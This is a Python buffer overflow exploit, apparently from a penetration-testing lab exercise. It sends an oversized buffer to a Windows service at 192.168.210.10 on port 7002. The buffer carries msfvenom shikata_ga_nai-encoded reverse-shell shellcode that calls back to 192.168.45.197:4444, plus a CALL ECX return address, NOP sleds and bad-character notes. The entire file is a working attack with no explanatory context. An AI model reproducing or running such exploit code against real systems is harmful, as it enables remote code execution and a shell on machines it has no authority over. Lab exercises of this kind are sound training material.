#!/usr/bin/python
import socket

try:
  print("\nSending evil buffer...")

  #filler = b"A" * 2080

  eip = b"\x11\x2e\x80\x14"   # CALL ECX 14802e11 
  tail = b"\x43" * 12
  
  # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.197 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x3b\x45"

  shellcode = (
b"\xbe\x9b\xa3\x29\xc1\xdb\xcb\xd9\x74\x24\xf4\x5d\x2b\xc9"
b"\xb1\x52\x31\x75\x12\x03\x75\x12\x83\x5e\xa7\xcb\x34\x9c"
b"\x40\x89\xb7\x5c\x91\xee\x3e\xb9\xa0\x2e\x24\xca\x93\x9e"
b"\x2e\x9e\x1f\x54\x62\x0a\xab\x18\xab\x3d\x1c\x96\x8d\x70"
b"\x9d\x8b\xee\x13\x1d\xd6\x22\xf3\x1c\x19\x37\xf2\x59\x44"
b"\xba\xa6\x32\x02\x69\x56\x36\x5e\xb2\xdd\x04\x4e\xb2\x02"
b"\xdc\x71\x93\x95\x56\x28\x33\x14\xba\x40\x7a\x0e\xdf\x6d"
b"\x34\xa5\x2b\x19\xc7\x6f\x62\xe2\x64\x4e\x4a\x11\x74\x97"
b"\x6d\xca\x03\xe1\x8d\x77\x14\x36\xef\xa3\x91\xac\x57\x27"
b"\x01\x08\x69\xe4\xd4\xdb\x65\x41\x92\x83\x69\x54\x77\xb8"
b"\x96\xdd\x76\x6e\x1f\xa5\x5c\xaa\x7b\x7d\xfc\xeb\x21\xd0"
b"\x01\xeb\x89\x8d\xa7\x60\x27\xd9\xd5\x2b\x20\x2e\xd4\xd3"
b"\xb0\x38\x6f\xa0\x82\xe7\xdb\x2e\xaf\x60\xc2\xa9\xd0\x5a"
b"\xb2\x25\x2f\x65\xc3\x6c\xf4\x31\x93\x06\xdd\x39\x78\xd6"
b"\xe2\xef\x2f\x86\x4c\x40\x90\x76\x2d\x30\x78\x9c\xa2\x6f"
b"\x98\x9f\x68\x18\x33\x5a\xfb\xe7\x6c\x49\x3e\x8f\x6e\x91"
b"\xd1\x0c\xe6\x77\xbb\xbc\xae\x20\x54\x24\xeb\xba\xc5\xa9"
b"\x21\xc7\xc6\x22\xc6\x38\x88\xc2\xa3\x2a\x7d\x23\xfe\x10"
b"\x28\x3c\xd4\x3c\xb6\xaf\xb3\xbc\xb1\xd3\x6b\xeb\x96\x22"
b"\x62\x79\x0b\x1c\xdc\x9f\xd6\xf8\x27\x1b\x0d\x39\xa9\xa2"
b"\xc0\x05\x8d\xb4\x1c\x85\x89\xe0\xf0\xd0\x47\x5e\xb7\x8a"
b"\x29\x08\x61\x60\xe0\xdc\xf4\x4a\x33\x9a\xf8\x86\xc5\x42"
b"\x48\x7f\x90\x7d\x65\x17\x14\x06\x9b\x87\xdb\xdd\x1f\xa7"
b"\x39\xf7\x55\x40\xe4\x92\xd7\x0d\x17\x49\x1b\x28\x94\x7b"
b"\xe4\xcf\x84\x0e\xe1\x94\x02\xe3\x9b\x85\xe6\x03\x0f\xa5"
b"\x22")

  #badchars = 
  #	\x3b
  #	\x45
    
  #original size = 2096
  prenops = b"\x90" * 10
  postnops = b"\x90" * 10
  filler = b"\x41" * (2096 - len(eip) - len(prenops) - len(postnops) - len(shellcode) - len(tail))
  buffer = filler + prenops + shellcode + postnops + eip + tail
 
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.210.10", 7002))
  s.send(buffer)
  s.close()

  print("\nDone!")
 
except:
  print("\nCould not connect!")
